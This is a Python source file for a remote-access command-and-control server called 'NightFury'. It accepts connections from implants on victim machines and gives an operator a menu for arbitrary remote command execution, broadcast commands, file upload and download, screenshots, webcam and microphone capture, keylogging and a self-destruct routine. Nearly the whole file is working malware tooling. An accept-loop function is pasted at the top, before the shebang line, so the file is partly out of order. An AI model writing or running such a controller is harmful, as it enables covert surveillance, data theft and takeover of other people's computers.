# ---------------------------
# Accept loop (runs in background thread)
# ---------------------------
def accept_loop(listen_sock):
    """Accept incoming client connections."""
    global next_client_id
    while running:
        try:
            conn, addr = listen_sock.accept()
            # Receive platform and hostname info as first message
            try:
                info = conn.recv(128).decode(errors="replace").strip()
                if info and '|' in info:
                    platform_info, hostname = info.split('|', 1)
                else:
                    platform_info, hostname = info or "Unknown", "Unknown"
            except Exception:
                platform_info, hostname = "Unknown", "Unknown"
            with clients_lock:
                next_client_id += 1
                cid = next_client_id
                clients[cid] = (conn, addr)
                client_platforms[cid] = platform_info
                client_hostnames[cid] = hostname
            print(f"\n[+] Client {cid} connected from {addr} ({platform_info}, {hostname})")
        except OSError:
            # Socket closed or interrupted
            break
        except Exception as e:
            # Unexpected error — continue accepting
            print(f"[!] Accept error: {e}")
            continue
#!/usr/bin/env python3
"""
NightFury C2 Server (debugged)
- Prints colored ASCII banner on startup
- Accepts multiple clients (stored in `clients`)
- Operator menu runs in main thread (safe for input())
- Accept loop runs in background thread
- Clean shutdown on Ctrl+C
"""
import base64
import os

import socket
import threading
import signal
import sys
from datetime import datetime

import pyfiglet
from colorama import Fore, Style, init

# ---------------------------
# Banner (exactly like you wanted)
# ---------------------------
init(autoreset=True)


def print_banner():
    # Create ASCII art for tool name
    fig = pyfiglet.Figlet(font="slant")
    ascii_art = fig.renderText("NightFury")

    # Create ASCII art for tagline
    fig2 = pyfiglet.Figlet(font="cybermedium")
    tag = fig2.renderText("Command the Night")

    # Print ASCII art in color (line-by-line to ensure coloring works correctly)
    for line in ascii_art.rstrip("\n").splitlines():
        print(Fore.RED + Style.BRIGHT + line)
    for line in tag.rstrip("\n").splitlines():
        print(Fore.WHITE + Style.BRIGHT + line)

    # Optional: add metadata in different colors
    print(Fore.WHITE + "=" * 100)
    print(Fore.RED + "Team : SHADOWNET")
    print(Fore.RED + "Team Member : Rohit Nandi, Chiranjit Ghosh, Bikram Dey, Pritam Das")
    print(Fore.RED + "Version: 1.0")
    print(Fore.WHITE + "=" * 100)


# ---------------------------
# Server state
# ---------------------------
clients = {}  # {id: (conn, addr)}
client_platforms = {}  # {id: platform string}
client_hostnames = {}  # {id: hostname string}
clients_lock = threading.Lock()
server = None  # global server socket
accept_thread = None
next_client_id = 0
running = True


# ---------------------------
# Helper functions
# ---------------------------
def get_client_response(conn):
    """Get response from client until [END OF STREAM] marker."""
    output_buffer = ""
    while True:
        try:
            chunk = conn.recv(4096).decode(errors="replace")
        except Exception:
            chunk = ""
        if not chunk:
            return "[!] Connection lost"
        output_buffer += chunk
        if "[END OF STREAM]" in output_buffer:
            return output_buffer.replace("[END OF STREAM]", "").strip()

# ---------------------------
# Client session handling
# ---------------------------
def client_session(conn, client_id):
    """Interactive session with a specific client (used when operator selects a client)."""

    # Get client IP and port for organizing downloads
    client_ip, client_port = clients[client_id][1][0], clients[client_id][1][1]
    # Get hostname and platform if available
    hostname = client_hostnames.get(client_id, "")
    platform_short = client_platforms.get(client_id, "")
    # Shorten platform for directory name
    if platform_short.lower().startswith("win"):
        platform_short = "Win"
    elif platform_short.lower().startswith("lin"):
        platform_short = "Linux"
    elif platform_short.lower().startswith("mac"):
        platform_short = "Mac"
    else:
        platform_short = platform_short[:6] if platform_short else ""
    # Compose directory name
    dir_parts = [f"{client_ip}_{client_port}"]
    if hostname:
        dir_parts.append(hostname)
    if platform_short:
        dir_parts.append(platform_short)
    client_dir = "_".join(dir_parts)
    downloads_dir = os.path.join("downloads", client_dir)
    os.makedirs(downloads_dir, exist_ok=True)

    print("\nAvailable commands:")
    print("- back/exit: Return to main menu")
    print("- upload <local_file> [remote_path]: Upload a file to the client (supports custom/nested paths)")
    print("- download <remote_file>: Download a file from the client (saved by client IP and port)")
    print("- screenshot: Capture a screenshot from the client (saved as screenshot_<client_ip>_<port>_YYYYMMDD_HHMMSS.png)")
    print("- webcam: Capture a webcam image from the client (saved as webcam_<client_ip>_<port>_YYYYMMDD_HHMMSS.png)")
    print("- audio [seconds]: Capture audio from the client microphone (saved as audio_<timestamp>.wav, default 5s, max 60s)")
    print("- keylogger_start [filename]: Start keylogger (log saved in downloads/<client_ip>_<port>/)")
    print("- keylogger_stop: Stop the keylogger")
    print("- selfdestruct / delete: Remove client.py from the client and exit")
    print("- Other commands will be executed on the client system")
    print(f"Note: Downloads, screenshots, webcam images, audio, and keylogs will be saved in {downloads_dir}\n")

    while True:
        try:
            cmd = input(f"C2({client_id})> ").strip()
            if cmd.lower() in ("exit", "back"):
                print(f"[i] Detached from Client {client_id}")
                break
            if cmd == "":
                continue

            # Handle upload command
            if cmd.startswith("upload "):
                try:
                    # Parse command parts - support paths with spaces and backslashes
                    cmd_rest = cmd[7:].strip()  # Remove "upload "
                    
                    # Find quoted sections first
                    import re
                    quoted_pattern = r'"([^"]*)"'
                    matches = re.findall(quoted_pattern, cmd_rest)
                    
                    if len(matches) >= 1:
                        local_path = matches[0]
                        remote_path = matches[1] if len(matches) > 1 else os.path.basename(local_path)
                    else:
                        # Fallback to space-separated without quotes
                        parts = cmd_rest.split(None, 1)  # Split on first whitespace only
                        if len(parts) < 1:
                            print("[!] Error: Missing file path")
                            print("[i] Usage: upload local_file.txt remote_file.txt")
                            continue
                        local_path = parts[0]
                        remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_path)
                    # Validate local file
                    if not os.path.exists(local_path):
                        print(f"[!] Error: Local file not found: {local_path}")
                        continue
                    if not os.path.isfile(local_path):
                        print(f"[!] Error: Not a file: {local_path}")
                        continue
                    print(f"[*] Uploading {local_path} to {remote_path}")
                    try:
                        # Read and encode file with timeout protection
                        with open(local_path, "rb") as f:
                            file_content = f.read()
                        b64_content = base64.b64encode(file_content).decode()
                        # Use a special delimiter to separate base64 from filepath
                        delimiter = "||FILEPATH||"
                        conn.sendall(f"upload {b64_content}{delimiter}{remote_path}".encode())
                    except PermissionError:
                        print(f"[!] Error: Permission denied reading file: {local_path}")
                        continue
                    except OSError as e:
                        print(f"[!] Error reading file: {str(e)}")
                        continue
                except Exception as e:
                    print(f"\n[!] Upload failed: {str(e)}")
                    continue
            # Handle download command
            elif cmd.startswith("download "):
                try:
                    conn.sendall(cmd.encode())
                except Exception as e:
                    print(f"[!] Error sending to client {client_id}: {e}")
                    continue
            else:
                try:
                    conn.sendall(cmd.encode())
                except Exception as e:
                    print(f"[!] Error sending to client {client_id}: {e}")
                    break

            # Get response from client
            response = get_client_response(conn)
            if response == "[!] Connection lost":
                print(f"[!] Lost connection to client {client_id}")
                with clients_lock:
                    if client_id in clients:
                        clients[client_id][0].close()
                        del clients[client_id]
                return


            # Handle screenshot response
            if cmd == "screenshot" and response.startswith("SCREENSHOT:"):
                try:
                    _, b64_content = response.split(":", 1)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    save_path = os.path.join(downloads_dir, f"screenshot_{timestamp}.png")
                    os.makedirs(downloads_dir, exist_ok=True)
                    img_bytes = base64.b64decode(b64_content)
                    with open(save_path, "wb") as f:
                        f.write(img_bytes)
                    print(f"[+] Screenshot saved to: {save_path}")
                except Exception as e:
                    print(f"[!] Error saving screenshot: {str(e)}")
                continue

            # Handle webcam response
            if cmd == "webcam" and response.startswith("WEBCAM:"):
                try:
                    _, b64_content = response.split(":", 1)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    save_path = os.path.join(downloads_dir, f"webcam_{timestamp}.png")
                    os.makedirs(downloads_dir, exist_ok=True)
                    img_bytes = base64.b64decode(b64_content)
                    with open(save_path, "wb") as f:
                        f.write(img_bytes)
                    print(f"[+] Webcam image saved to: {save_path}")
                except Exception as e:
                    print(f"[!] Error saving webcam image: {str(e)}")
                continue

            # Handle keylog response sent by client on keylogger_stop
            if response.startswith("KEYLOG:"):
                try:
                    # Format: KEYLOG:filename:base64data
                    _, rest = response.split(":", 1)
                    fname, b64_content = rest.split(":", 1)
                    save_path = os.path.join(downloads_dir, fname)
                    os.makedirs(downloads_dir, exist_ok=True)
                    data = base64.b64decode(b64_content)
                    with open(save_path, "wb") as f:
                        f.write(data)
                    print(f"[+] Keylog saved to: {save_path}")
                except Exception as e:
                    print(f"[!] Error saving keylog: {str(e)}")
                continue

            # Handle audio response
            if cmd.startswith("audio") and response.startswith("AUDIO:"):
                try:
                    _, b64_content = response.split(":", 1)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    save_path = os.path.join(downloads_dir, f"audio_{timestamp}.wav")
                    os.makedirs(downloads_dir, exist_ok=True)
                    audio_bytes = base64.b64decode(b64_content)
                    with open(save_path, "wb") as f:
                        f.write(audio_bytes)
                    print(f"[+] Audio saved to: {save_path}")
                except Exception as e:
                    print(f"[!] Error saving audio: {str(e)}")
                continue

            # Handle file download response
            if cmd.startswith("download ") and response.startswith("FILE:"):
                try:
                    # Parse response with file content
                    _, b64_content = response.split(":", 1)
                    # Show initial info
                    original_path = cmd.split(" ", 1)[1].strip().strip('"')
                    save_path = os.path.join(downloads_dir, os.path.basename(original_path))
                    # Ensure downloads directory exists
                    os.makedirs(downloads_dir, exist_ok=True)
                    print(f"\n[*] Downloading: {original_path}")
                    print(f"[*] Saving to: {save_path}")
                    # Process and save file
                    file_content = base64.b64decode(b64_content)
                    with open(save_path, "wb") as f:
                        f.write(file_content)
                    # Final status
                    print(f"\n[+] File downloaded successfully")
                    print(f"[i] From client: {client_ip}")
                    print(f"[i] Final size: {len(file_content)/1024:.1f} KB")
                except Exception as e:
                    print(f"\n[!] Download failed while saving: {str(e)}")
            else:
                print(response)
        except KeyboardInterrupt:
            # Returning to operator menu on Ctrl+C (don't kill whole server)
            print("\n[i] Returning to operator menu")
            return


# ---------------------------
# Broadcast
# ---------------------------
def broadcast_command(cmd):
    """Send a command to all connected clients and print their outputs."""
    with clients_lock:
        if not clients:
            print("[!] No clients connected")
            return
        items = list(clients.items())

    results = []
    for cid, (conn, addr) in items:
        try:
            conn.sendall(cmd.encode())
        except Exception as e:
            print(f"[!] Failed to send to client {cid}: {e}")
            with clients_lock:
                if cid in clients:
                    clients[cid][0].close()
                    del clients[cid]
            continue

        # Read response until sentinel
        output_buffer = ""
        while True:
            try:
                chunk = conn.recv(4096).decode(errors="replace")
            except Exception:
                chunk = ""
            if not chunk:
                print(f"[!] Lost connection to client {cid}")
                with clients_lock:
                    if cid in clients:
                        clients[cid][0].close()
                        del clients[cid]
                break
            output_buffer += chunk
            if "[END OF STREAM]" in output_buffer:
                output_buffer = output_buffer.replace("[END OF STREAM]", "")
                results.append((cid, output_buffer.strip()))
                break

    # Print results
    for cid, output in results:
        print(Fore.RED + f"\n--- Client {cid} ---\n{ Fore.WHITE + output}\n")


# ---------------------------
# Shutdown
# ---------------------------
def shutdown_server(signum=None, frame=None):
    """Gracefully stop server and all clients"""
    global running, server
    running = False
    print("\n[*] Stopping server and closing all clients...")
    with clients_lock:
        for cid, (conn, addr) in list(clients.items()):
            try:
                conn.sendall(b"exit")
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
            if cid in clients:
                del clients[cid]
    try:
        if server:
            server.close()
    except Exception:
        pass
    # If we are called from signal handler, exit:
    sys.exit(0)


# ---------------------------
# Operator menu (runs in main thread)
# ---------------------------
def operator_menu():
    """Main operator interface — runs in the main thread (safe for input())."""
    global clients
    try:
        while running:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            if cmd == "list":
                with clients_lock:
                    if not clients:
                        print("No clients connected")
                    else:
                        print(f"{'ID':<4} {'IP':<15} {'Port':<6} {'Platform':<10} {'Hostname':<20}")
                        print("-" * 60)
                        for cid, (conn, addr) in clients.items():
                            plat = client_platforms.get(cid, "Unknown")
                            host = client_hostnames.get(cid, "Unknown")
                            print(f"{cid:<4} {addr[0]:<15} {addr[1]:<6} {plat:<10} {host:<20}")

            elif cmd.startswith("select "):
                try:
                    cid = int(cmd.split()[1])
                    with clients_lock:
                        if cid in clients:
                            client_conn = clients[cid][0]
                        else:
                            print("[!] Invalid client ID")
                            continue
                    client_session(client_conn, cid)
                except ValueError:
                    print("[!] Usage: select <id>")

            elif cmd.startswith("broadcast "):
                broadcast_cmd = cmd[len("broadcast "):].strip()
                if broadcast_cmd:
                    broadcast_command(broadcast_cmd)
                else:
                    print("[!] Usage: broadcast <command>")

            elif cmd in ("quit", "stop"):
                print("Exiting C2...")
                shutdown_server()
            elif cmd == "help":
                print("""
NightFury C2 Server Help
-----------------------
Commands:
  list                  List all connected clients
  select <id>           Interact with a specific client
  broadcast <cmd>       Send a command to all clients
  quit / stop           Stop the server and disconnect all clients
  help                  Show this help menu

Client Session Features:
  upload <local> [remote]   Upload file to client (supports custom/nested paths)
  download <remote>         Download file from client (saved by client IP)
  screenshot                Capture screenshot from client (saved as screenshot_YYYYMMDD_HHMMSS.png)
  back / exit               Return to main menu
  <any other command>       Execute on client system

Notes:
  - Downloads and screenshots are saved in downloads/<client_ip>/
  - Screenshot files are named with the current date and time for uniqueness
  - All file transfers use base64 encoding for safety
  - Proper error handling for missing files, permissions, and screenshot failures
                """)
            else:
                print("Commands: list, select <id>, broadcast <cmd>, quit/stop, help")
    except (KeyboardInterrupt, EOFError):
        # Ctrl+C in operator menu => shutdown
        shutdown_server()


# ---------------------------
# Start server (setup socket and accept thread)
# ---------------------------
def start_server(host="0.0.0.0", port=4444):
    global server, accept_thread
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    # Removed listening print statement as requested

    # start accept loop in a background thread
    accept_thread = threading.Thread(target=accept_loop, args=(server,), daemon=True)
    accept_thread.start()


# ---------------------------
# Main
# ---------------------------
if __name__ == "__main__":
    # Hook Ctrl+C to shutdown_server
    signal.signal(signal.SIGINT, shutdown_server)

    # Print banner and start server
    print_banner()
    start_server(host="0.0.0.0", port=4444)

    # Run operator menu in main thread (safe for input)
    operator_menu()
